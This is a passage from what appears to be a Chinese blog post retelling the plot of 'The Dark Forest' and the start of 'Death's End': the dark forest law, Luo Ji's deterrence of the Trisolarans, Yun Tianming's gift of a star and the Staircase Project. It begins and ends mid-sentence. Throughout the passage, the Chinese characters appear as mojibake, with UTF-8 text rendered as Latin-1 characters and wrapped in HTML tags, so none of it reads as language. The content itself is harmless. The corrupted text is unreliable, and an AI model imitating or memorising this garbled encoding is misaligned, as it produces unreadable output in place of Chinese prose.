æ•°çš„å¤–æ˜Ÿç”Ÿå‘½éƒ½åœ¨ä»¥æŒ‡æ•°å¢é•¿ã€‚æ‰€ä»¥å®‡å®™æ˜¯ä¸€ä¸ªç”Ÿå­˜æ­»å±€ã€‚ä¸æ˜¯ä½ æ­»ï¼Œå°±æ˜¯æˆ‘äº¡ã€‚åœ¨è¿™ç§ä¸¥æ ¼ç«äº‰ä¸‹ï¼Œä¸€æ–¹çš„æ”¶ç›Šå¿…ç„¶æ„å‘³ç€å¦ä¸€æ–¹çš„æŸå¤±ï¼ŒåŒæ–¹ä¸å­˜åœ¨åˆä½œçš„å¯èƒ½ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œè‡ªå·±æ–‡æ˜çš„æœªæ¥ï¼Œå°±æ˜¯å»ºç«‹åœ¨ä»–äººæ–‡æ˜çš„ç—›è‹¦ä¹‹ä¸Šï¼Œåªæœ‰æŸäººåˆ©å·±æ‰èƒ½æ´»ä¸‹å»ã€‚å…¶ç»“æœå°±æ˜¯ï¼Œä¸€æ–¹åƒæ‰å¦ä¸€æ–¹ï¼Œæ‰€ä»¥æ¯ä¸ªæ–‡æ˜éƒ½å¿…é¡»ä¸ºäº†ç”Ÿå­˜è€Œæˆ˜ã€‚å†å¼±å°çš„æ–‡æ˜éƒ½æœ‰å¯èƒ½æŠ€æœ¯çˆ†ç‚¸ï¼Œä»äººç±»æ–‡æ˜æ¥çœ‹ï¼Œæˆ‘ä»¬ä»çŒ¿çŒ´åˆ°ç°åœ¨ï¼Œä»å®‡å®™çš„å°ºåº¦ï¼Œå°±æ˜¯ä¸€ç¬é—´çš„äº‹ï¼Œè¿™å°±å¯¼è‡´æ–‡æ˜ä¹‹é—´ï¼Œéšç€æ—¶é—´æ¨ç§»ä¼šä¸æ–­å‡ºç°çŒœç–‘ï¼Œå¤§å®¶è„‘å­é‡Œéƒ½åœ¨æƒ³ï¼Œä»–ä¼šä¸ä¼šæ¥å¹²æ‰æˆ‘ï¼ŒæŠ¢æˆ‘èµ„æºï¼Œè¿™ç§ä¸æ–­å½¢æˆçš„çŒœç–‘é“¾ã€‚åœæ­¢çš„æ–¹æ³•ï¼Œåªæœ‰ä¸€æ–¹æ­»äº†æ‰ä¼šç»“æŸã€‚æ‰€ä»¥ä¸ºäº†é¿å…å…¶ä»–æ–‡æ˜æŠ€æœ¯çˆ†ç‚¸ï¼Œåœ¨ä»¥åè·Ÿè‡ªå·±äº‰å¤ºèµ„æºã€‚æœ€å®‰å…¨çš„æ–¹æ³•å°±æ˜¯å‘ç°ä¸€ä¸ªæ–‡æ˜åï¼Œèƒ½æ¶ˆç­çš„å°±ç›´æ¥æ¶ˆç­ï¼Œæ‰“ä¸è¿‡çš„å°±ç»•ç€èµ°ã€‚</p><p>&emsp;&emsp;ç½—è¾‘æŠŠå®‡å®™æ¯”å–»æˆä¸€èµ°é»‘æš—æ£®æ—ï¼Œæ¯ä¸ªæ–‡æ˜éƒ½æ˜¯å¸¦æªçš„çŒäººï¼Œåƒå¹½çµä¸€èˆ¬å‰è¡Œåœ¨æ—é—´ï¼Œæ¯ä¸ªçŒäººéƒ½å¿…é¡»å°å¿ƒï¼Œå› ä¸ºåªè¦æš´éœ²è‡ªå·±çš„ä½ç½®ï¼Œå°±ä¼šè¢«å…¶ä»–æ–‡æ˜å¹²æ‰ï¼Œæ¯•ç«Ÿè¿™æ˜¯ä¿è¯è‡ªå·±å®‰å…¨æœ€å¥½çš„æ‰‹æ®µã€‚</p><p>&emsp;&emsp;æˆ‘ç›¸ä¿¡ç©è¿‡åƒé¸¡çš„äººéƒ½æ˜ç™½è¿™ç§æ„Ÿå—ï¼Œæƒ³è¦æ´»ä¸‹å»å°±å¾—å¹²æ‰å…¶ä»–äººã€‚</p><p>&emsp;&emsp;ç½—è¾‘ä¹‹å‰çš„å’’è¯­ï¼Œå°±åƒæ˜¯åœ¨æ£®æ—ä¸­çš„æŸæ£µæ ‘ä¸Šåšäº†æ ‡è®°ï¼Œé‚£ä¹ˆå…¶ä»–çš„çŒæ‰‹æœ€å®‰å…¨çš„è¡Œä¸ºï¼Œå°±æ˜¯æ‚„æ‚„æ¯æ‰é‚£ç‰‡åŒºåŸŸã€‚æ¯•ç«Ÿå¯¹äºé«˜çº§æ–‡æ˜æ¥è¯´ï¼Œæ”»å‡»æ˜¯æœ€èŠ‚çœæˆæœ¬çš„ã€‚ä½†ç°åœ¨ç½—è¾‘å†ä¹Ÿå‘ä¸å‡ºå’’è¯­äº†ï¼Œå› ä¸ºæ°´æ»´å°é”äº†å¤ªé˜³ä¿¡å·ã€‚å…¶å®æ—©åœ¨å¹¸å­˜èˆ°é˜Ÿä¹‹é—´çš„é»‘æš—æˆ˜å½¹ä¼ å›åœ°çƒåï¼Œç½—è¾‘å°±å·²ç»ç¡®ä¿¡ï¼Œé»‘æš—æ£®æ—æ³•åˆ™æ˜¯æ²¡æœ‰é—®é¢˜çš„ã€‚ç½—è¾‘åªè®©å²å¼ºæ˜ç™½äº†çœŸç›¸ï¼Œå¹¶è®©ä»–ä¿å¯†.ä»–ç°åœ¨æ— è®¡å¯æ–½ï¼Œæ¸æ¸åœ°ï¼Œç½—è¾‘å¼€å§‹å€Ÿé…’æ¶ˆæ„ï¼Œé—­é—¨ä¸å‡ºï¼Œåƒä¸ªæµæµªæ±‰ä¸€æ ·åœ¨è¡—ä¸Šæ¸¸è¡.åæ¥æ”¿åºœæœºæ„å¼ºè¿«ç½—è¾‘éšä¾¿å¹²ç‚¹ä»€ä¹ˆä»¥å¢åŠ äººæ°‘çš„ä¿¡ä»°ï¼Œç»™äº†ç½—è¾‘é›ªåœ°é¡¹ç›®ã€‚</p><p>&emsp;&emsp;è¿™ä¸ªé¡¹ç›®æ˜¯é€šè¿‡æ’æ˜Ÿæ°¢å¼¹ï¼Œå’Œæµ·ç‹æ˜Ÿçš„æ²¹è†œç‰©è´¨åˆ¶é€ å¤ªç©ºå°˜åŸƒï¼Œä»¥ä¾¿åœ¨å…¶ä½™ä¹ä¸ªæ°´æ»´åˆ°è¾¾åœ°çƒå‰ï¼Œå¯ä»¥æå‰è§‚æµ‹åˆ°ã€‚è¿™ä¸ªè®¡åˆ’æ˜¾ç„¶æ˜¯æ²¡äº‹æ‰¾äº‹ï¼Œæ¯•ç«Ÿè§‚æµ‹çš„å”¯ä¸€ä½œç”¨ä¾¿æ˜¯ï¼ŒçŸ¥é“å…¶ä½™æ°´æ»´ä»€ä¹ˆæ—¶å€™åˆ°åœ°çƒï¼Œç½—è¾‘æ— å¥ˆä¹‹ä¸‹å¼€å§‹è´Ÿè´£è¿™ä¸ªé¡¹ç›®ã€‚éšç€å·¥ä½œçš„è¿›å±•ï¼Œé€»è¾‘æŠŠå…¨éƒ¨èº«å¿ƒéƒ½æŠ•å…¥åˆ°äº†é›ªåœ°å·¥ç¨‹ï¼ŒæŠŠè¿™å½“æˆä¸€ç§é€ƒé¿æ‰‹æ®µ.ä½†ä»–è¶ŠæŠ•å…¥ï¼Œäººä»¬å°±è¶Šå¤±æœ›ã€‚å¤§å®¶é€æ¸çœ‹æ¸…ï¼Œç½—è¾‘çš„è¡Œä¸ºæ˜¯åœ¨é€ƒé¿ï¼Œè¿™æ˜¯ä¸€ä¸ªå¸Œæœ›å’Œå¤±æœ›æ¥çš„ä¸€æ ·å¿«çš„æ—¶ä»£ã€‚å…¬ä¼—å¯¹ç½—è¾‘å¤±å»äº†ä¿¡å¿ƒã€‚å¾ˆå¤šäººéƒ½å¼€å§‹æ€€ç–‘ç½—è¾‘çš„å’’è¯­ï¼Œä¸è¿‡æ˜¯ä¸€æ¬¡å·§åˆã€‚ç½—è¾‘ä»äººä»¬å¿ƒä¸­çš„ç¥ï¼Œå˜æˆäº†æ™®é€šäººï¼Œåˆå˜æˆäº†å¤§éª—å­ã€‚ä»–é¢å£è€…çš„å®é™…æƒåŠ›ä¹Ÿæ²¡æœ‰äº†ã€‚é›ªåœ°å·¥ç¨‹ä¹Ÿä¸å¾—ä¸åœæ­¢ã€‚</p><p>&emsp;&emsp;åœ¨ä¸€ä¸ªç§‹é›¨è¿ç»µçš„ä¸‹åˆï¼Œç½—è¾‘è¢«é€å‡ºè‡ªå·±ç”Ÿæ´»å¤šå¹´çš„å°åŒºã€‚ä»–ç©¿ç€å¾ˆè„çš„å¤–å¥—ï¼Œæ‹¿ç€é“é”¹ï¼Œèµ°åˆ°äº†æœ€åˆå’Œå¶æ–‡æ´å¯¹è¯çš„é‚£ç‰‡å¢“åœ°ã€‚ä»–åœ¨å¶æ–‡æ´å¢“æ—å¼€å§‹ç»™è‡ªå·±æ˜å¢“ï¼Œæœ€åç²¾ç–²åŠ›å°½çš„ä»–ï¼Œè¶Ÿè¿›å‘ä¸­å›æƒ³èµ·è‡ªå·±çš„ä¸€ç”Ÿï¼Œä»–çŸ¥é“ï¼Œæ˜¯æ—¶å€™äº†ã€‚ä»–è™šå¼±çš„æ‹¿èµ·æ‰‹æªï¼Œå¯¹ç€ç©ºæ°”é«˜å–Šã€‚æˆ‘ï¼Œè¦å’Œä¸‰ä½“äººå¯¹è¯ã€‚éšåéœ²å‡ºäº†æ‰‹è…•ä¸Šçš„æ‰‹è¡¨ï¼Œè¿™æ˜¯ä¸€ä¸ªæ£€æµ‹æˆ‘ç”Ÿå‘½ä½“å¾çš„æ‘‡ç¯®ç³»ç»Ÿï¼Œåªè¦æˆ‘æ­»äº†ï¼Œå­¦å¼Ÿå·¥ç¨‹ä¸Šçš„ä¸‰åƒå…­ç™¾ä¸€åå››é¢—æ°¢å¼¹å°±ä¼šçˆ†ç‚¸ï¼Œç”±æ­¤å½¢æˆæ— æ¯”å·¨å¤§çš„æ²¹è†œï¼Œå°†ä¼šé€šè¿‡å¤ªé˜³åå°„å‡ºä¸‰å¼ æ— æ¯”ç®€å•çš„çªç„¶ï¼Œè¿™ä¸‰å¼ å›¾å°±æ˜¯ä¸‰ä½“æ˜Ÿçƒçš„åæ ‡ã€‚å®‡å®™ä¸­å…¶ä»–çš„æ–‡æ˜å°†ä¼šçŸ¥é“ä½ ä»¬çš„å­˜åœ¨ã€‚ä»–è¯´ï¼Œ30ç§’åæˆ‘å°†å¯¹è‡ªå·±çš„å¿ƒè„å¼€æªï¼Œè™½ç„¶æˆ‘çŸ¥é“ä¸‰ä½“æ˜Ÿçƒæš´éœ²åï¼Œåœ°çƒä¹Ÿä¼šéšä¹‹æš´éœ²ï¼Œä½†æˆ‘ï¼Œåªèƒ½è¿™æ ·åšã€‚</p><p>&emsp;&emsp;çŸ­çŸ­å‡ ç§’ï¼Œä¸€ç›´æ— å¤„ä¸åœ¨çš„æ™ºå­åœ¨ç½—è¾‘é¢å‰å±•å¼€æˆä¸‰ä¸ªçƒï¼Œä¸Šé¢å†™ç€ï¼Œä½æ‰‹ã€‚ä¸‰ä½“äººé€šè¿‡æ™ºå­åˆè¯´ï¼Œä½ æŠŠæªæ”¾ä¸‹ï¼Œå’±ä»¬å¥½å¥½è°ˆã€‚éšåç½—è¾‘æå‡ºçš„å‡ ä¸ªæ¡ä»¶ä¸‰ä½“äººéƒ½ç…§åŠäº†ã€‚ç¬¬ä¸€ã€æ°´æ»´é£ç¦»å¤ªé˜³ç³»ï¼›ç¬¬äºŒã€ä¸‰ä½“é£èˆ¹ç¦»å¼€æ¥å¤ªé˜³ç³»çš„è½¨é“ã€‚</p><p>&emsp;&emsp;ç½—è¾‘èƒœåˆ©äº†ï¼Œä»–å®Œæˆäº†é¢å£è€…çš„ä½¿å‘½ï¼Œä»–è™šå¼±å¾—å·®ç‚¹æ™•è¿‡å»ï¼Œæ™ºå­ä¸æ–­åœ°å…³å¿ƒç½—è¾‘çš„èº«ä½“çŠ¶å†µï¼Œç”Ÿæ€•æ‘‡ç¯®ç³»ç»Ÿç»ˆæ­¢ã€‚æ‘‡ç¯®ç³»ç»Ÿæ˜¯éå¸¸ä¸¥è°¨çš„ï¼Œå¦‚æœæ°´æ»´è¯•å›¾å»è§¦ç¢°é›ªåœ°å·¥ç¨‹ä¸Šçš„æ°¢å¼¹ï¼Œä¹Ÿä¼šå¼•å‘çˆ†ç‚¸ã€‚ä»–å¾ˆå¹¸è¿ï¼Œå¦‚æœä¸æ˜¯ä¸‰ä½“äººå› ä¸ºçŒœç–‘ï¼Œæ¶ˆç­äº†äººç±»å›å†›ï¼Œç½—è¾‘æ—©å°±æ­»äº†ã€‚</p><p>&emsp;&emsp;äº”å¹´åã€‚ç½—è¾‘å’Œä»–çš„å¦»å¥³æ¥åˆ°äº†ä¸‰ä½“äººå¸®åœ°çƒäººå»ºé€ çš„å¼•åŠ›æ³¢å¤©çº¿é™„è¿‘ç©è€ï¼Œè¿™ç§å¤©çº¿ä¸éœ€è¦é€šè¿‡å¤ªé˜³ï¼Œç›´æ¥å°±å¯ä»¥åƒå®‡å®™å‘å°„ä¿¡å·ï¼Œæ­£åœ¨ç©è€çš„ä¸€å®¶äººï¼Œçªç„¶çœ‹è§æ™ºå­åœ¨ä»–ä»¬é¢å‰å±•å¼€ï¼Œä¸ä»–å¯¹è¯çš„æ˜¯å½“å¹´è­¦å‘Šäººç±»ä¸è¦å›å¤çš„ç›‘å¬å‘˜1379ã€‚ä»–ä¸é€»è¾‘ç›¸äº’è¡¨è¾¾æ•¬æ„ã€‚ä¸´è¿‘æ™šéœï¼Œ1379è¯´ï¼Œå¤ªé˜³å¿«è½ä¸‹å»äº†ï¼Œä½ ä»¬çš„å­©å­å±…ç„¶ä¸å®³æ€•ã€‚ç½—è¾‘å›ç­”é“ï¼Œå½“ç„¶ä¸å®³æ€•ï¼Œå¥¹çŸ¥é“ï¼Œæ˜å¤©çš„å¤ªé˜³è¿˜ä¼šå‡èµ·æ¥ã€‚</p><p>&emsp;&emsp;ä»å¶æ–‡æ´å¼€å¤´å’Œç½—è¾‘çš„å¯¹è¯å¯ä»¥çœ‹å‡ºï¼Œè¿™ä¸ªæŠŠäººç±»å‘æ­»çš„å¥³äººï¼Œåœ¨é‚£æ—¶è²Œä¼¼å¼€å§‹æœ‰äº†ä¸€ä¸æ„§ç–šã€‚ç¤¾ä¼šä¸­ä¸€æ—¶å…´èµ·çš„é€ƒäº¡ä¸»ä¹‰ï¼Œç”±äºåªæœ‰å°‘éƒ¨åˆ†äººå¯ä»¥é€ƒèµ°ï¼Œæ‰€ä»¥è¢«å¤§éƒ¨åˆ†äººç¦æ­¢äº†ã€‚åœ¨æ­¤æ—¶ï¼Œäººäººå‘å¾€çš„å…¬å¹³ï¼Œåè€Œæˆä¸ºäº†äººç±»ç”Ÿå­˜çš„éšœç¢ã€‚åœ¨æ™ºå­çš„ç›‘è§†ä¸‹ï¼Œäººç±»å˜å¾—æ¯«æ— éšç§ï¼Œäººä»¬ä¸ºäº†æ¬ºéª—ä¸‰ä½“äººï¼Œåˆ¶å®šäº†é¢å£è€…è®¡åˆ’ï¼Œé€‰å‡ºå››ä½å¤§éª—å­ä½œä¸ºé¢å£è€…å»éª—ä¸‰ä½“äººï¼Œå…¶ä¸­ä¸‰ä½é¢å£è€…éƒ½æ˜¯ä¸–ç•ŒçŸ¥åäººç‰©ï¼Œçœ‹ä¼¼å¿—åœ¨å¿…å¾—ï¼Œä¿¡å¿ƒæ»¡æ»¡ï¼Œä½†éƒ½è¢«ä¸€ä¸€å‡»è´¥ï¼Œè€Œç½—è¾‘å´æˆä¸ºäº†çœŸæ­£çš„æ•‘ä¸–ä¸»ã€‚äººç±»ä»ç»æœ›çš„å¤§ä½è°·æ—¶ä»£è§‰é†’ï¼Œè¿›å…¥äº†ä¿¡å¿ƒæ»¡æ»¡çš„æ–°æ—¶ä»£ï¼Œå´åˆåœ¨æœ«æ—¥ä¹‹æˆ˜ä¸­å†æ¬¡é™·å…¥äº†ç»æœ›ï¼Œè¿™é‡Œå¥½åƒæ˜¯åœ¨è¯´ï¼Œäººæ€»æ˜¯å¥½äº†ä¼¤ç–¤å¿˜äº†ç–¼ã€‚ä»å¹¸å­˜çš„é‚£å‡ è‰˜é£èˆ¹ä¹‹é—´çš„æˆ˜æ–—ï¼Œå†åˆ°å®‡å®™çš„é»‘æš—æ£®æ—æ³•åˆ™å¯ä»¥çœ‹å‡ºï¼Œç«äº‰æ˜¯æ®‹é…·çš„ã€‚å®‡å®™æ˜¯ä¸€ä¸ªç”Ÿæ­»å±€ï¼Œä¸æ˜¯ä½ æ­»å°±æ˜¯æˆ‘æ´»ã€‚ä»é€ƒäº¡ä¸»ä¹‰ï¼Œåˆ°æ³°å‹’å’Œé›·è¿ªäºšå…¹è¦ä»¥æ€æ­»è‡ªå·±äººä¸ºä»£ä»·ï¼Œå»å¨æ…‘ä¸‰ä½“äººï¼›å†åˆ°ç½—è¾‘æ€•å…¬ä¼—çŸ¥é“é»‘æš—æ£®æ—æ³•åˆ™åå¤§å®¶åå¯¹è‡ªå·±çš„è®¡åˆ’æ‰€ä»¥ä¸æ•¢å…¬å¸ƒï¼Œè¿™äº›æˆ–è®¸æƒ³å‘Šè¯‰æˆ‘ä»¬ï¼Œå¤§å¤šæ•°äººéƒ½æ˜¯è‡ªç§çš„ï¼Œæ•´ä¸ªæ•…äº‹æ— è®ºæ˜¯å¶æ–‡æ´çš„æ‚”æ‚Ÿï¼Œè¿˜æ˜¯ç½—è¾‘çš„æˆé•¿ï¼Œåˆæˆ–æ˜¯äººç±»ä»ç—›è‹¦çš„åçœï¼Œè¿™äº›éƒ½ä»¿ä½›åœ¨å‘Šè¯‰æˆ‘ä»¬ï¼Œç—›è‹¦æ˜¯æˆé•¿çš„å‚¬åŒ–å‰‚ã€‚</p><h3 id="æ­»ç¥æ°¸ç”Ÿ-ä¸Š"><a href="#æ­»ç¥æ°¸ç”Ÿ-ä¸Š" class="headerlink" title="æ­»ç¥æ°¸ç”Ÿ ä¸Š"></a>æ­»ç¥æ°¸ç”Ÿ ä¸Š</h3><p>&emsp;&emsp;è¿™ä¸ªæ•…äº‹è¦ä»ä¸€ä¸ªå«äº‘å¤©æ˜çš„äººå¼€å§‹è¯´èµ·ã€‚åœ¨ä»¥å‰çš„å±æœºçºªå…ƒ4å¹´ï¼Œé‚£ä¸ªæ—¶å€™çš„äººä»¬å¿ƒæƒ…å¾ˆå¤æ‚ï¼Œå¤–æ˜Ÿäºº400å¹´åä¼šæ¥ä¾µç•¥åœ°çƒè¿™ä¸ªæ¶ˆæ¯ï¼Œåœ¨é‚£ä¼šå¯æ˜¯ä¸€ä¸ªæ—¢æ–°é²œåˆå¯æ€•åˆåŠ²çˆ†çš„æ¶ˆæ¯ï¼Œå„ä¸ªåª’ä½“éƒ½åœ¨é“ºå¤©ç›–åœ°çš„æŠ¥é“è¿™ä»¶äº‹æƒ…ã€‚ä¸è¿‡åœ¨äº‘å¤©æ˜çœ¼é‡Œï¼Œä»€ä¹ˆä¸‰ä½“äººå››ç™¾å¹´åä¼šä¾µç•¥åœ°çƒï¼Œé‚£éƒ½ä¸æ˜¯äº‹å„¿ï¼Œå› ä¸ºä»¥ä»–çš„ç—…æƒ…ï¼Œæ˜å¹´çš„äº‹éƒ½ä¸ç”¨ä»–æ“å¿ƒäº†ã€‚ä»–çš„èº«è¾¹æ²¡æœ‰å‡ ä¸ªäº²æˆšï¼Œå…¶ä¸­ä»–çš„å§å§è¿˜æ€»æƒ³è®©ä»–æ—©ç‚¹å®‰ä¹æ­»ï¼Œé‚£æ—¶å€™ï¼Œæ²»ç–—ç»ç—‡å°±æ˜¯ä¸ªèŠ±é’±çš„æ— åº•æ´ï¼Œå¯¹äºæ‹–å®¶å¸¦å£è¿˜æ²¡ä¹°æˆ¿å­çš„å§å§æ¥è¯´ï¼Œå¼Ÿå¼Ÿäº‘å¤©æ˜æ—©ç‚¹æ­»å¥¹è¿˜èƒ½ä»çˆ¶äº²é‚£æ‹¿åˆ°ä¸å°‘é—äº§ã€‚äº‘å¤©æ˜ä¹Ÿå¾ˆè¯†è¶£ï¼Œä¹Ÿä¸æƒ³å—ç½ªã€‚æƒ³ç€ï¼Œå°±è¿™ä¸¤å¤©å‡†å¤‡å®‰ä¹æ­»å§ã€‚</p><p>&emsp;&emsp;å°±åœ¨ä»–æƒ³ç€å®‰ä¹æ­»çš„è¿™ä»¶äº‹å„¿çš„æ—¶å€™ï¼Œäº‘å¤©æ˜çš„åŒå­¦èƒ¡æ–‡ï¼Œå¸¦ç€åˆ›ä¸šæˆåŠŸçš„å–œæ‚¦æ‰¾åˆ°äº†äº‘å¤©æ˜ã€‚èƒ¡æ–‡çš„å…¬å¸ä¸»è¦æ˜¯å–é¥®æ–™çš„ï¼Œèƒ¡æ–‡èƒ½æ¥æ‰¾äº‘å¤©æ˜å¹¶ä¸æ˜¯ä»–ä»¬ä¹‹é—´å…³ç³»æœ‰å¤šå¥½ï¼Œè€Œæ˜¯èƒ¡æ–‡å–é¥®æ–™èƒ½æˆåŠŸï¼Œæ˜¯å› ä¸ºï¼Œäº‘å¤©æ˜çš„ä¸€ä¸ªç‚¹å­ã€‚è¿™ä¸ªç‚¹å­æ¥è‡ªäºäº‘å¤©æ˜å¯¹é¥®æ–™ç‹¬ç‰¹çš„çˆ±å¥½ï¼Œè¿™ä¸ªçˆ±å¥½å°±æ˜¯ï¼Œåœ¨çŸ¿æ³‰æ°´é‡Œå¡é‡è‰å–ã€‚èƒ¡æ–‡å½“åœºç»™äº†äº‘å¤©æ˜ä¸‰ç™¾ä¸‡ï¼Œè¿™ç¬”é’±å¯¹äº‘å¤©æ˜æ¥è¯´å¯æœ‰å¯æ— ï¼Œäº‘å¤©æ˜æœ¬æƒ³æ‹’ç»ï¼Œä½†èƒ¡æ–‡éå¸¸åšæŒï¼Œæ— å¥ˆä¹‹ä¸‹äº‘å¤©æ˜æ‰æ”¶ä¸‹äº†è¿™ç¬”å·¨æ¬¾ã€‚æ²¡å¤šä¹…ï¼Œäº‘å¤©æ˜è¿˜æ˜¯å†³å®šå®‰ä¹æ­»ï¼Œä»–çš„ç—…å·²ç»é‡åˆ°äº”ç¦äº«å—è¿™300ä¸‡äº†ã€‚è¿™ç¬”å·¨æ¬¾ä»–å¹¶ä¸æ‰“ç®—ç•™ç»™å§å§ï¼Œæ¯•ç«Ÿäº‘å¤©æ˜å·²ç»å¦‚å§å§æ‰€æ„¿ï¼Œèµ¶ç´§å»é˜ç‹çˆ·é‚£æŠ¥é“äº†ã€‚æ­¤æ—¶ï¼Œä»–çªç„¶çµå…‰ä¸€é—ªï¼Œäº‘å¤©æ˜å†³å®šç”¨è¿™ç¬”é’±ï¼Œç»™ä»–å¤§å­¦é‡Œæš—æ‹çš„ç¨‹å¿ƒé€ä¸€é¢—æ˜Ÿæ˜Ÿï¼Œä¸€é¢—çœŸæ­£çš„æ˜Ÿæ˜Ÿã€‚</p><p>&emsp;&emsp;é‚£å»å“ªä¹°ä¸€é¢—æ˜Ÿæ˜Ÿå‘¢ï¼Ÿè¿™æ˜¯è”åˆè‚¡å±•å¼€äº†ä¸€é¡¹ç¾¤æ˜Ÿè®¡åˆ’ï¼Œä¸»è¦çš„ç›®çš„ï¼Œæ˜¯éª—é’±ã€‚ã€‚ã€‚å¯¹å¤–å«ç­¹æ¬¾ã€‚ä»–ä»¬æ‹å–å¤ªé˜³ç³»å¤–çš„éƒ¨åˆ†æ’æ˜Ÿæ‰€æœ‰æƒï¼Œä¹°åˆ°äº†ï¼Œåˆ™ä¼šå¾—åˆ°ä¸€å¼ çº¸ï¼Œä¸Šé¢æ ‡æ˜ä½ çš„åˆæ³•æ‰€æœ‰æƒã€‚æ™šä¸Šçš„æ—¶å€™ä½ å°±å¯ä»¥æœ›ç€è¿™é¢—æ˜Ÿæ˜Ÿï¼Œå¿ƒç†æš—çˆ½ï¼Œå“ˆå“ˆï¼Œè¿™é¢—æ˜Ÿæ˜Ÿæ˜¯æˆ‘çš„äº†ã€‚ç„¶åå°±æ²¡ä»€ä¹ˆä¹±ç”¨äº†ã€‚å¦‚æœä½ æƒ³å»é‚£é‡Œï¼Œä¸å¥½æ„æ€ï¼Œä¸å¯èƒ½ã€‚æœ€è¿‘çš„æ’æ˜Ÿéƒ½æœ‰ä¸€ç™¾å¤šå…‰å¹´çš„è·ç¦»ï¼Œæ‰€ä»¥è¿™ä¸ªè®¡åˆ’ï¼Œå¼€å§‹æ—¶å°±ç»“æŸäº†ï¼Œæ€»å…±ä¹Ÿæ²¡å–å‡ºå»å¤šå°‘é¢—ã€‚ä¸è¿‡æœ‰æ²¡æœ‰ç”¨å¯¹äºäº‘å¤©æ˜ç°åœ¨æ¥è¯´å·²ç»ä¸é‡è¦äº†ï¼Œä»–ä»èƒ¡æ–‡é‚£è¦åˆ°äº†ç¨‹å¿ƒå¾—ä¸ªäººèµ„æ–™ï¼ŒèŠ±äº†ä¸‰ç™¾ä¸‡ï¼ŒåŒ¿åä¹°äº†ä¸€é¢—æ’æ˜Ÿé€ç»™ç¨‹å¿ƒã€‚ä¸ç¦æ„Ÿå¹ï¼Œäº‘å¤©æ˜çœŸæ˜¯ä¸ªæµªæ¼«çš„äººå•Šã€‚ç¬¬äºŒå¤©ï¼Œäº‘å¤©æ˜å¼€å§‹æ¥å—å®‰ä¹æ­»ã€‚æ­£å½“ä»–è¦æ‘ä¸‹æœ€åçš„ç¡®è®¤æŒ‰é’®æ—¶ï¼Œç¨‹å¿ƒå¸¦ç€äººçªç„¶å‡ºç°ã€‚ç¨‹å¿ƒå¯¹ä»–è¯´å‡ºçš„ç¬¬ä¸€å¥è¯éå¸¸å‡ºä¹æ„æ–™ï¼Œå¤©æ˜ï¼Œä½ çŸ¥é“ä¹ˆï¼Œå®‰ä¹æ­»æ³•æ˜¯ä¸ºä½ é€šè¿‡çš„ã€‚ </p><p>&emsp;&emsp;è¿™è¯å°±è¦ä»é˜¶æ¢¯è®¡åˆ’è¯´èµ·æ¥ï¼Œå½“æ—¶ç¨‹å¿ƒåœ¨æƒ…æŠ¥å±€å·¥ä½œï¼Œå±€é•¿å«ç»´å¾·ï¼Œæ˜¯ä¸€ä½é›·å‰é£è¡Œçš„å…³é”®äººç‰©ï¼Œä»–æœ‰ä¸€å¥å¹¿ä¸ºäººçŸ¥çš„å£å·ï¼šå‰è¿›ï¼Œå‰è¿›ï¼Œä¸æ‹©æ‰‹æ®µçš„å‰è¿›ã€‚ç»´å¾·æƒ³å‘å°„ä¸€æšé€Ÿåº¦è¾¾åˆ°ç™¾åˆ†ä¹‹ä¸€å…‰é€Ÿçš„æ¢æµ‹å™¨ï¼Œå»è·å¾—ä¸‰ä½“èˆ°é˜Ÿçš„æƒ…æŠ¥ï¼Œåœ¨è¿™æ—¶ï¼Œé€ ä¸€æšç™¾åˆ†ä¹‹ä¸€å…‰é€Ÿçš„æ¢æµ‹å™¨æ˜¯ä¸å¤§ç°å®çš„ã€‚ä½†ç¨‹å¿ƒæå‡ºäº†ä¸€ä¸ªè®¾æƒ³ï¼Œé€ å‡ºä¸€æšåªæœ‰è¾å°„å¸†çš„å°å‹æ¢æµ‹å™¨ï¼Œå¹¶åœ¨è¾å°„å¸†çš„èˆªè¡Œè½¨é“å¸ƒç½®æ ¸å¼¹ï¼Œæ¯ä¸€æ¬¡æ ¸å¼¹çˆ†ç‚¸éƒ½ä¼šä½¿é£èˆ¹åŠ é€Ÿï¼Œè¿™ä¸ªè¿‡ç¨‹ï¼Œå¾ˆåƒåœ¨æ”€ç™»é˜¶æ¢¯ï¼Œè¯¥è®¡åˆ’ï¼Œè¢«å‘½åä¸ºé˜¶æ¢¯è®¡åˆ’ã€‚è¿™ä¸ªè®¡åˆ’çš„è´Ÿè´£äººï¼Œæ­£å¼ç¨‹å¿ƒï¼Œè¿™æšæ¢æµ‹å™¨å¿…é¡»éå¸¸çš„è½»ï¼Œç”±äºæŠ€æœ¯çš„é™åˆ¶ï¼Œå¯¼è‡´æ¢æµ‹å™¨å°åˆ°åªèƒ½æ”¾å…¥ä¸€ä¸ªè¢«æ€¥å†»çš„äººè„‘ï¼Œé˜¶æ¢¯è®¡åˆ’çœŸæ˜¯æ²¡æœ‰åŠæ³•çš„åŠæ³•ï¼Œå¤§å®¶åªèƒ½é€‰æ‹©ç›¸ä¿¡ä¸‰ä½“äººæœ‰èƒ½åŠ›æŠŠä¸€é¢—äººè„‘è¿˜åŸæˆä¸€ä¸ªäººï¼Œå¹¶ä¸”ä»–ä»¬æ„¿æ„å»è¿™ä¹ˆåšã€‚è¿™ç§è¡Œä¸ºæ— å¼‚äºèµŒåšï¼Œä¸”å¤±è´¥ç‡å¾ˆé«˜ï¼Œä½†åªè¦æˆåŠŸï¼Œåªè¦æœ‰ä¸€ä¸ªäººèƒ½è¿›å…¥ä¸‰ä½“èˆ°é˜Ÿçš„å†…éƒ¨ï¼Œå°±ä¼šå¼•èµ·æ— é™çš„å¯èƒ½æ€§ã€‚ç¨‹å¿ƒåœ¨æ‰§è¡Œè¿™ä¸€è®¡åˆ’æ—¶ï¼Œå¾—çŸ¥æœ‰äººåŒ¿åé€ç»™äº†è‡ªå·±ä¸€é¢—æ˜Ÿæ˜Ÿï¼Œè¿™å¯¹ä»–æ¥è¯´æ˜¯ä¸€ä¸ªå·¨å¤§çš„æƒŠå–œã€‚æ­¤åˆ»çš„å¥¹é™·å…¥äº†ä»æœªæœ‰è¿‡çš„å¹¸ç¦æ„Ÿã€‚</p><p>&emsp;&emsp;é˜¶æ¢¯è®¡åˆ’æ­£åœ¨ç´§é”£å¯†é¼“çš„è¿›è¡Œç€ã€‚ä½†ç”¨è°çš„å¤§è„‘æˆäº†é—®é¢˜ï¼Œåœ¨ç¤¾ä¼šé“å¾·çš„å‹åŠ›ä¸‹ï¼Œè¿™ä¸ªäººåªèƒ½ä»èº«æ‚£ç»ç—‡å¹¶ä¸”